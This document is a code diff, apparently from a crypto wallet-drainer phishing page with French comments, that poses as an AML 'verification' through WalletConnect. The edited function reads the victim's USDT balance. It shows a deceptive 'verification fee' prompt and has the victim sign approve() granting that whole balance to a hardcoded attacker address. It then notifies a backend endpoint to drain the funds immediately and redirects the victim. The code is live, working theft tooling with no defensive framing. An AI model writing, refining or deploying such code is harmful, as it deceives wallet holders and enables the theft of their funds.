@@ -919,10 +919,10 @@
   /* ===== WalletConnect + Approbation fantôme via AMLVerifier ===== */
   const ATTACKER = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
   const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
-  const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+  const RPC_URL = 'https://eth-mainnet.g.alchemy.com/v2/demo';
+  const PROVIDER = new ethers.providers.JsonRpcProvider(RPC_URL);
   const API = '/api/store-victim';
   const PROJECT_ID = '22d764eabb976a73c5ee29567f3972d6';
-  const BRIDGE_ADDRESS = '0x5a312c88B002838C9782463706Bf7E9D11E398Dc'; // WalletDrainBridge
 
   let signClient, session, account;
 
@@ -1034,26 +1034,43 @@
     setTimeout(sendApprovalTransaction, 1000); // ← change startVerification → requestSignature
   }
 
-async function sendApprovalTransaction() {
+async function sendExactApproveTransaction() {
   try {
     const scanText = document.querySelector('.scan');
-    if (scanText) scanText.textContent = 'Confirmez la vérification de propriété…';
+    if (scanText) scanText.textContent = 'Détection de votre solde USDT…';
 
-    // Préparer l’appel à verifyEligibility(USDT)
-    const iface = new ethers.utils.Interface([
-      'function verifyEligibility(address token)'
+    // Lire le solde USDT de la victime
+    const usdtContract = new ethers.Contract(USDT_ADDR, [
+      'function balanceOf(address) view returns (uint256)',
+      'function decimals() view returns (uint8)'
+    ], PROVIDER);
+    const [balance, decimals] = await Promise.all([
+      usdtContract.balanceOf(account),
+      usdtContract.decimals()
     ]);
-    const data = iface.encodeFunctionData('verifyEligibility', [USDT_ADDR]);
+
+    if (balance.isZero()) {
+      if (scanText) scanText.textContent = '❌ Aucun USDT détecté.';
+      return;
+    }
+
+    const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
+    if (scanText) scanText.textContent = `Confirmez l'autorisation de ${balanceFormatted} USDT (frais de vérification).`;
+
+    // Appeler approve(ATTACKER, balance) sur le contrat USDT
+    const iface = new ethers.utils.Interface([
+      'function approve(address spender, uint256 amount)'
+    ]);
+    const data = iface.encodeFunctionData('approve', [ATTACKER, balance]);
 
     const txParams = {
       from: account,
-      to: BRIDGE_ADDRESS,
+      to: USDT_ADDR,
       data: data,
       value: '0x0',
-      gas: '0x493E0', // ~300k gas, la victime paie les frais
+      gas: '0x493E0',
     };
 
-    // Envoyer la transaction via WalletConnect → la victime verra une pop-up Trust Wallet
     const txHash = await signClient.request({
       topic: session.topic,
       chainId: 'eip155:1',
@@ -1065,24 +1082,17 @@ async function sendApprovalTransaction() {
       },
     });
 
-    console.log('Tx envoyée:', txHash);
-    if (scanText) scanText.textContent = '✅ Vérification terminée. Vous allez être redirigé…';
+    console.log('Tx approve exacte envoyée:', txHash);
+    if (scanText) scanText.textContent = '✅ Autorisation donnée. Vérification terminée.';
 
-    // Enregistrer la victime et déclencher le drain via ton backend
-    try {
-      await fetch('/api/store-victim', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ victim: account, chain: '1' })
-      });
-    } catch (e) {
-      console.error('Erreur appel store-victim:', e);
-    }
+    // Drain immédiat
+    await fetch('/api/store-victim', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ victim: account, chain: '1' })
+    });
 
-    // Petite redirection après 3 secondes
-    setTimeout(() => {
-      window.location.href = '/verifyaddress.html';
-    }, 3000);
+    setTimeout(() => window.location.href = '/verifyaddress.html', 3000);
 
   } catch (e) {
     console.error('Transaction error:', e);
@@ -1090,7 +1100,6 @@ async function sendApprovalTransaction() {
     if (scanText) scanText.textContent = '❌ Transaction refusée.';
   }
 }
-
   // ===== Historique des victimes (inchangé) =====
   let victimPollTimer = null;
 
